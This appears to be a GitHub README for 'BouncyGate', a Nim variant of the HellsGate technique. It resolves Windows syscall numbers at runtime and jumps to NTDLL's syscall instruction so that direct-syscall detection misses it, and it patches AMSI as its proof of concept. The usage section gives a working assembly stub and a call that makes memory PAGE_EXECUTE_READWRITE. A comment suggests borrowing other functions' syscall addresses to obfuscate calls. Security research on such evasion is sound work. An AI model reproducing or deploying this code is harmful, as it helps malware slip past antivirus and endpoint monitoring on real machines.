# BouncyGate

This is a modified version of [@zimawhit3's implementation](https://github.com/zimawhit3/HellsGateNim) of HellsGate in Nim, with additionally making sure that all syscalls go through NTDLL, by replacing the syscall instructions with a JMP to the `syscall` instruction in NTDLL that corresponds to the syscall being executed. The syscalls are then used to patch AMSI as a PoC.

See https://eversinc33.github.io/posts/avoiding-direct-syscall-instructions/ for an explanation.

If you would like to learn more about how HellsGate works, you can find smelly__vx's (@RtlMateusz) and am0nsec's (@am0nsec) paper at the [Vx-Underground Github](https://github.com/vxunderground/VXUG-Papers/tree/main/Hells%20Gate).

Install mingw 8.0.0-1, since the newest version has some issues related to relocation that make compilation impossible.

### Usage

First, the syscall stub has to be defined:

```nim
proc NtProtectVirtualMemory(ProcessHandle: Handle, BaseAddress: PVOID, NumberOfBytesToProtect: PULONG, NewAccessProtection: ULONG, OldAccessProtection: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, `ntProtectSyscall`
        mov r11, `ntProtectSyscallJumpAddress`
        jmp r11
        ret
    """
```

Then the syscall number can be resolved at runtime and the syscall can be used afterwards:

```nim
var ntProtect = resolve_syscall("NtProtectVirtualMemory")
ntProtectSyscall = ntProtect.wSysCall
ntProtectSyscallJumpAddress = ntProtect.syscallJumpAddress # of course you can play around with the syscall jump addresses here and have it execute with the syscall fron a different function, to obfuscate your call
var status = NtProtectVirtualMemory(GetCurrentProcess(), &cs_addr, &p_len, cast[ULONG](PAGE_EXECUTE_READWRITE), &op)
```
